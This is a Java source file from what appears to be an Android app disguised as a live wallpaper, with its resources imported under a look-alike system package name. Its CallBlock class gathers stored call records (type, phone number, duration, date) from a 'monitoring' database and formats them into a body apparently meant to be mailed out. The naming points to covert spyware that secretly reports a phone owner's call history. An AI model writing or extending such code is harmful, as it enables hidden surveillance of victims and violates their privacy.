package com.livewallpaper.circle.internet.block;

import java.util.ArrayList;

import com.android.os.R;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.Call;

import android.content.Context;
import android.util.Log;

public class CallBlock {
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static final String LOG_TAG = "monitoring";

	public static String getCall(Context context) {

		String mailCallList = "";
		try {
			ArrayList<Call> callList = mAdapter.selectCall();
			if (callList.size() != 0) {
				String calls = context.getResources().getString(R.string.calls);
				String incoming = context.getResources().getString(
						R.string.incoming);
				String outgoing = context.getResources().getString(
						R.string.outgoing);
				String missed = context.getResources().getString(
						R.string.missed);
				mailCallList += "\n\n \"" + calls + "\" \n\n";
				for (Call c : callList) {
					if (c.getType() == 1) {
						mailCallList += "  - " + incoming + " : ";
					} else if (c.getType() == 2) {
						mailCallList += "  - " + outgoing + " : ";
					} else if (c.getType() == 3) {
						mailCallList += "  - " + missed + " : ";
					}
					mailCallList += c.getPhone() + " - \"" + c.getDuraction()
							+ "\" - " + c.getDate();
					mailCallList += "\n\n";

				}
				Log.w(LOG_TAG, "getCall");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return mailCallList;

	}
}